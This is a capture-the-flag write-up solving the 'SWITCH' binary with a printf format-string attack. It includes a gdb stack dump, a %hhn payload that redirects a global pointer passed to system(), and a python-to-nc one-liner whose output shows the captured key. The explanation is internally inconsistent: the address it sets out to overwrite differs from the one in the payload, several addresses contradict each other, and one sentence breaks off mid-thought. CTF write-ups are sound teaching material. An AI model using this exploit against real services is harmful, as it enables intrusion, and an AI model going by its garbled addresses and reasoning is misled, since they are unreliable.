## SWITCH [140]

## Solution
`read()` up to `0x4f` (79) bytes from `stdin` into `buffer[]` in `main()`. There are two global variables (`char*` pointers) that point to strings in a string table in `.rodata`:
```
0x0804a030   char* not_used      "cat key"                @ 0x08048620 in .rodata
0x0804a034   char* used          "echo no key for you"    @ 0x08048628 in .rodata
```

By default, `used` is copied to `arg` (another global variable), which is then passed as an argument to `system()`. Our goal is to switch the value of `used` from `0x08048628` to `0x08048620` so that it points to "cat key" and we will be able to read the key once `system()` is called. To do this, we will use a format string attack in `printf()` since it is called with a format string but no other arguments. If we break just before the call to `printf()`, we can see how the stack looks and build our format string:
```
ameise@STAHLKERN:~/CS2015/pwn/140_SWITCH$ gdb ./switch 
Reading symbols from ./switch...(no debugging symbols found)...done.
(gdb) break *08048565
Invalid number "08048565".
(gdb) break *0x08048565
Breakpoint 1 at 0x8048565
(gdb) run
Starting program: /home/ameise/CS2015/pwn/140_SWITCH/switch 
State your case.
aaaabbbbccccdddd

Breakpoint 1, 0x08048565 in main ()
(gdb) x/64xw $esp
0xffffce70:	0xffffce8c	0xffffce8c	0x0000004f	0x00000000
0xffffce80:	0xf7ffd000	0xf7ffd918	0xffffcea0	0x61616161
0xffffce90:	0x62626262	0x63636363	0x64646464	0x0000000a
0xffffcea0:	0xffffffff	0x0000002f	0xf7e0ddc8	0xf7fd5858
0xffffceb0:	0x00008000	0xf7fb3000	0xf7fb1244	0xf7e190ec
0xffffcec0:	0x00000001	0x00000007	0xf7e2fa30	0x080485eb
[...]
```

The stack variables can be `$` referenced as follows:
```
0$   0xffffce8c ---+ address of format string
1$   0xffffce8c    |
2$   0x0000004f    |
3$   0x00000000    |
4$   0xf7ffd000    |
5$   0xf7ffd918    |
6$   0xffffcea0    |
7$   0x61616161 <--+
8$   0x62626262
9$   0x63636363
10$  0x64646464
11$  0x0000000a
12$  0xffffffff
13$  0x0000002f
14$  0xf7e0ddc8
15$  0xf7fd5858
[...]
```

We need to write an exact amount of bytes so that we can use a `%n` format specifier to overwrite the value of `used` at `0x0804a034` to `0x0806a020` instead of `0x0804a028`. Luckily, only the last byte is different, so we can just use a `%hhn` format specifier to only overwrite the first byte from `0x28` to `0x20` (the lowest-order byte will be first in memory due to little-endianness.) However, since it will be difficult to Let's stick the address of `used` at stack variable `11$` to ensure we have enough room for the first part of the format string:
```
```
0$   0xffffce8c ---+ address of format string
1$   0xffffce8c    |
2$   0x0000004f    |
3$   0x00000000    |
4$   0xf7ffd000    |
5$   0xf7ffd918    |
6$   0xffffcea0    |
7$   0x61616161 <--+   '%'  '0'  '3'  '2'
8$   0x62626262        'x'  '%'  '1'  '0'
9$   0x63636363        '$'  'h'  'h'  'n'
10$  0x64646464        'x40''xa0''x04''x08'
11$  0x0000000a        'b'  'b'  'b'  'b'
12$  0xffffffff
13$  0x0000002f
14$  0xf7e0ddc8
15$  0xf7fd5858
[...]
```

Now we can build our format string and get the key:
```
ameise@STAHLKERN:~/CS2015/pwn/140_SWITCH$ python -c 'print "%032x%10$hhn\x40\xa0\x04\x08"' | nc shell.cyberstakesonline.com 10992
State your case.
66a6b930461e95bf01d1adf484761984
000000000000000000000000ffffdbac@�
```